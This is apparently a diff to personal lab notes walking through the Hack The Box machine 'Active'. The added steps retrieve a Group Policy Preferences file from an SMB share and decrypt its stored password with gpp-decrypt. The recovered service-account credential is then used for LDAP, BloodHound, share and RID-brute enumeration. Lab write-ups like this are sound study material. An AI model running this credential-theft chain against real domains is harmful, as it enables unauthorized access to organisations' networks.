@@ -54,4 +54,70 @@ smbclient //10.10.10.100/Replication -N
 >[!example]- Result
 >![[Pasted image 20250311010347.png]]
 
-Looks like we have a replication of the `SYSVOL` folder
+# Exploitation
+Looks like we have a replication of the `SYSVOL` folder, as the version of windows is old we can try to get the [cached GPP](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=sysvol#cached-gpp-pasword) `\\active.htb\Replication\Policies\*\Machine\Preferences\Groups\Groups.xml`
+```bash
+mget \\10.10.10.100\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
+```
+>[!example]- Result
+>![[Pasted image 20250311020702.png]]
+
+- now we can use a tool like [[gpp-decrypt]]
+```bash
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+```
+>[!example]- Result
+>![[Pasted image 20250311021906.png]]
+>![[Pasted image 20250311022016.png]]
+
+Credentials `active.htb\SVC_TGS:GPPstillStandingStrong2k18`
+
+- If we test de credenials using [[crackmapexec]] , they are valid
+```bash
+crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18'
+```
+>[!example]- Result
+>![[Pasted image 20250311022340.png]]
+
+# Enumeration 2
+## LDAP
+- Using the credentials
+```bash
+ldapsearch -H ldap://10.10.10.100 -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b 'DC=active,DC=htb'
+
+or
+
+ldapdomaindump 10.10.10.100 -u 'active.htb\svc_tgs' -p 'GPPstillStandingStrong2k18'
+
+```
+>[!example]- Result
+>![[Pasted image 20250311024510.png]]
+
+## Bloodhaund
+- using [[bloodhaund-python]] and [[bloodhaunt]] to get a better view of the AD enviroment
+```bash
+bloodhound-python -d active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -c ALL -ns 10.10.10.100 --dns-tcp
+```
+
+## SMB
+- now we can access an other folders 
+```bash
+crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+```
+>[!example]- Result
+>![[Pasted image 20250311022533.png]]
+
+- We are able to enumerate users using RID
+```bash
+crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute
+
+or
+# to get only user names
+crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute | grep -oP '(?<=ACTIVE\\)(\S+)(?= \(SidTypeUser\))'
+
+```
+>[!example]- Result
+>![[Pasted image 20250311023023.png]]
+
+
+- 
